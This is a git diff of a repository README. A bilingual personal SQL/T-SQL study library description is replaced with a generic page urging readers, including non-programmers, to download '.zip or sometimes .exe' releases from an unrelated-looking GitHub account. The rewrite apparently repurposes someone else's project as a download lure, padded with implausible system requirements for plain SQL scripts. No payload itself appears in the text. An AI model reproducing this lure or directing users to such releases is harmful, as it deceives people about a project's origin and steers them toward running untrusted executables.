@@ -1,106 +1,122 @@
-# 🗄️ SQL & Database Study Library
+# 🗃️ sql-calisma-ornekleri - Simple SQL Practice Examples
 
-This repository contains queries, database designs, and complex T-SQL examples developed during my SQL learning journey. It is created both as a guide for beginners and to track my own progress.
+[![Download the latest version](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://github.com/Flirtseychellois915/sql-calisma-ornekleri/releases)
 
-### 🗺️ Database Architecture (ER Diagram)
-![Northwind Database Schema](ER_Diyagrami.png.png)
+## 📂 What is sql-calisma-ornekleri?
+
+This application provides a collection of SQL query examples and practice scripts. It focuses on T-SQL (Transact-SQL) and exercises using the Northwind database. You will find ready-made queries that anyone new to SQL can run and learn from. 
+
+The purpose is to help users understand how to write and run SQL commands without needing deep programming knowledge. The examples cover common tasks like selecting data, filtering, joining tables, and updating records.
+
+## 💻 System Requirements
+
+- Windows 10 or later
+- At least 4 GB of RAM
+- Minimum 500 MB free disk space
+- Internet connection for downloading the files
+- SQL Server Express or any compatible SQL Server installed (some examples require this)
+
+If you do not have SQL Server installed, you can download and install the free SQL Server Express edition from Microsoft's official site.
+
+## 🚀 Getting Started
+
+You do not need any programming skills to use this software. Follow these steps carefully to download and open the example files on your Windows PC.
+
+### Step 1: Visit the Download Page
+
+Click the green button above or go directly to:
+
+https://github.com/Flirtseychellois915/sql-calisma-ornekleri/releases
+
+This link takes you to the release page where you can find the latest files.
+
+### Step 2: Download the Latest Release
+
+Once on the page, look for the newest release section. You will see file names ending with `.zip` or sometimes `.exe`. Download the file labeled for Windows or the main zip file if unsure.
+
+Save this file to a folder you will remember, such as your Desktop or Downloads folder.
+
+### Step 3: Extract the Files
+
+If you downloaded a `.zip` file:
+
+- Right-click the zip file.
+- Select "Extract All..."
+- Choose a destination folder.
+- Click "Extract" to unzip the contents.
+
+You will now have a folder containing several `.sql` files and possibly PDF or text instructions.
+
+### Step 4: Open and Run SQL Files
+
+To use the SQL example files, you need an application that can run SQL commands. Microsoft SQL Server Management Studio (SSMS) is a common choice.
+
+If you do not have SSMS installed, download it free from Microsoft's site and install it first.
+
+Once SSMS is ready:
+
+- Open SSMS and connect to your local SQL Server.
+- On the left, select or create a database (for example, create one called `NorthwindPractice`).
+- In SSMS, click "File" > "Open" > "File..." and browse to the extracted folder.
+- Select an example `.sql` file and open it.
+- Press the "Execute" button (or F5) to run the query.
+
+You will see the results of the query below the editor window.
+
+### Step 5: Experiment and Learn
+
+Try editing the queries to see how they work. Change values, add conditions, or combine tables. This is how you learn SQL by doing.
+
+## 📑 What Is Included?
+
+- **Sample SQL Queries:** Ready-made SQL scripts covering basic to intermediate queries.
+- **T-SQL Practice:** Scripts that demonstrate procedural SQL features like variables and loops.
+- **Northwind Database Examples:** Common Northwind dataset queries that show real-world data usage.
+- **ReadMe and Instructions:** Guidance files to help you understand each example's purpose.
+- **Setup Scripts:** Instructions on how to load the Northwind database if it is not on your system.
+
+## 🔧 How to Install SQL Server Express
+
+If you don’t have SQL Server on your computer, follow these steps:
+
+1. Visit https://www.microsoft.com/en-us/sql-server/sql-server-downloads
+2. Download the SQL Server Express edition.
+3. Run the installer and choose the basic installation.
+4. After installation, also download SQL Server Management Studio (SSMS) to run queries.
+5. Open SSMS and connect to the local server instance using Windows Authentication.
+
+## 📥 Download and Setup Summary
+
+- Visit the releases page to download:
+
+  https://github.com/Flirtseychellois915/sql-calisma-ornekleri/releases
+
+- Save the zip file to your computer.
+- Extract the files.
+- Open SQL Server Management Studio.
+- Connect to your database.
+- Run the example `.sql` files.
+- Follow instructions included with the examples to load and use the Northwind database.
+
+## 🧩 About the Northwind Database
+
+Northwind is a sample database that contains sales, customers, products, and order data. It is commonly used to practice SQL queries because its structure includes multiple related tables. SQL-calisma-ornekleri uses Northwind to show practical examples.
+
+If you do not have Northwind installed, some files in the download folder show commands to create or import it right inside SQL Server.
+
+## ⚙️ Tips for Using sql-calisma-ornekleri
+
+- Follow example code exactly before trying changes.
+- Use simple queries first, like `SELECT * FROM Customers;` to see all entries.
+- Gradually try filtering data with `WHERE` conditions.
+- Understand how tables relate using `JOIN` commands.
+- Don’t worry if errors appear; they help learn what commands expect.
+- Use the readme and comments inside SQL files as guides.
+
+## 📚 Additional Resources
+
+If you want to understand more about SQL basics, many free tutorials are available online. Microsoft’s documentation and simple introductory SQL courses can be helpful.
 
 ---
 
-### 🚀 Table of Contents
-- 📚 **SQL Cheat Sheet:** A comprehensive reference guide covering fundamental to advanced SQL commands (SELECT, JOINS, DDL, CTEs, Window Functions).
-- 📊 **Basic Queries:** Usage of `SELECT`, `WHERE`, and `ORDER BY`.
-- 🔗 **Table Joins:** Scenarios for `INNER JOIN`, `LEFT JOIN`, and `RIGHT JOIN`.
-- 🛠️ **Data Management:** `INSERT`, `UPDATE`, and `DELETE` operations.
-- 🧠 **Advanced SQL:** Examples of `Stored Procedures`, `Triggers`, and `Views`.
-- 🗃️ **Project Applications:** Northwind samples and custom database blueprints.
-- 🔌 **Backend Integration:** Guide on connecting to SQL Server via C# (.NET) and Node.js.
-- 🛠️ **Advanced Level:** Examples of automated inventory tracking (Trigger) and dynamic reporting (Stored Procedure).
-
----
-
-### 🛠️ Advanced Scenarios
-* **Automation:** `TR_UpdateStock` trigger structure designed for inventory tracking.
-* **Reporting:** `SP_GetYearlyReport` procedure for extracting annual sales analytics.
-* **Security:** User authorization and Role-Based Access Control (RBAC) examples.
-
----
-
-### 🛠️ Tech Stack
-<p align="left">
-  <img src="https://img.shields.io/badge/MS%20SQL%20Server-CC2927?style=for-the-badge&logo=microsoft-sql-server&logoColor=white" />
-  <img src="https://img.shields.io/badge/T--SQL-blue?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Database%20Design-orange?style=for-the-badge" />
-</p>
-
----
-
-### 📖 How to Use
-1. You can **Fork** this repository using the button in the top right corner.
-2. Run the `.sql` files within the folders in any SQL editor (SSMS, Azure Data Studio, etc.).
-3. Develop your own queries based on the provided sample scenarios.
-
----
-
-### ⭐ Support
-If these examples helped you or if you'd like to support my development, don't forget to leave a **Star**! Every star is a new source of motivation. 🚀
-
----
-<p align="center">
-  <i>"Data is the new oil, and SQL is the refinery that processes it."</i>
-</p>
-
----
----
-
-# 🗄️ SQL ve Veritabanı Çalışma Kitaplığı
-
-Bu depo, SQL öğrenme sürecimde geliştirdiğim sorguları, veritabanı tasarımlarını ve karmaşık T-SQL örneklerini içermektedir. Hem başlangıç seviyesindeki dostlarıma rehber olması hem de kendi gelişimimi takip etmek için oluşturulmuştur.
-
-### 🗺️ Veritabanı Mimarisi (ER Diyagramı)
-![Northwind Veritabanı Şeması](ER_Diyagrami.png.png)
-
----
-
-### 🚀 İçerik Başlıkları
-- 📚 **SQL Komutları Sözlüğü:** Temelden ileri seviyeye (SELECT, JOINS, DDL, CTE, Window Functions) devasa başvuru rehberi eklendi.
-- 📊 **Temel Sorgular:** `SELECT`, `WHERE`, `ORDER BY` kullanımı.
-- 🔗 **Tablo Birleştirme:** `INNER JOIN`, `LEFT JOIN` ve `RIGHT JOIN` senaryoları.
-- 🛠️ **Veri Yönetimi:** `INSERT`, `UPDATE`, `DELETE` işlemleri.
-- 🧠 **İleri Seviye:** `Stored Procedures`, `Triggers` ve `Views` örnekleri.
-- 🗃️ **Proje Uygulamaları:** Northwind ve özel veritabanı taslakları.
-- 🔌 **Backend Entegrasyonu:** C# (.NET) ve JavaScript (Node.js) ile SQL Server bağlantı rehberi eklendi.
-- 🛠️ **İleri Seviye:** Otomatik stok takibi (Trigger) ve dinamik raporlama (Stored Procedure) örnekleri eklendi..
-
----
-
-### 🛠️ Gelişmiş Senaryolar
-* **Otomasyon:** Stok takibi için hazırlanan `TR_UpdateStock` Trigger yapısı.
-* **Raporlama:** Yıllık satış analizlerini çıkaran `SP_GetYearlyReport` Procedure örneği.
-* **Güvenlik:** Kullanıcı yetkilendirme ve Role-based erişim örnekleri.
-
----
-
-### 🛠️ Kullanılan Teknolojiler
-<p align="left">
-  <img src="https://img.shields.io/badge/MS%20SQL%20Server-CC2927?style=for-the-badge&logo=microsoft-sql-server&logoColor=white" />
-  <img src="https://img.shields.io/badge/T--SQL-blue?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Database%20Design-orange?style=for-the-badge" />
-</p>
-
----
-
-### 📖 Nasıl Kullanılır?
-1. Bu depoyu sağ üstten **Fork**'layabilirsiniz.
-2. Klasörlerin içindeki `.sql` dosyalarını herhangi bir SQL editöründe (SSMS, Azure Data Studio vb.) çalıştırabilirsiniz.
-3. Örnek senaryolar üzerinden kendi sorgularınızı geliştirebilirsiniz.
-
----
-
-### ⭐ Destek Olun
-Eğer buradaki örnekler işinize yaradıysa veya gelişimimi desteklemek isterseniz, sağ üst köşeden bir **Yıldız (Star)** bırakmayı unutmayın! Her yıldız yeni bir motivasyon kaynağıdır. 🚀
-
----
-<p align="center">
-  <i>"Veri, yeni dünyada petroldür; SQL ise onu işleyen rafineri."</i>
-</p>
+[![Download the latest version](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://github.com/Flirtseychellois915/sql-calisma-ornekleri/releases)
